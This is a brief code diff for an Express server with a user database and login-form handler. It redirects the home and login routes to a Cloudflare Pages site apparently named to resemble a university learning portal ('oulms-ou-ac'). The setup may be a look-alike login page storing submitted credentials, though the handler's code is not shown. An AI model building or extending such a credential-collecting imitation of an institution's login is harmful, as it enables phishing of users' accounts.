@@ -23,16 +23,16 @@ const User = mongoose.model('User', userSchema);
 
 // Middleware
 app.use(bodyParser.urlencoded({ extended: true }));
-app.use(express.static(__dirname)); // Serve static files from the root directory
+app.use(express.static(__dirname)); // Still available if needed
 
-// Serve index.html as the homepage
+// Redirect root to Cloudflare Pages homepage
 app.get('/', (req, res) => {
-  res.sendFile(__dirname + '/index.html');
+  res.redirect('https://oulms-ou-ac.pages.dev/');
 });
 
-// Serve login.html when accessing /login route
+// Redirect to Cloudflare Pages login page
 app.get('/submit-form', (req, res) => {
-  res.sendFile(__dirname + '/login.html');
+  res.redirect('https://oulms-ou-ac.pages.dev/login');
 });
 
 // POST endpoint to handle login form submission
@@ -62,4 +62,3 @@ app.post('/submit-form', async (req, res) => {
 app.listen(PORT, () => {
   console.log(`Server is running on http://localhost:${PORT}`);
 });
-
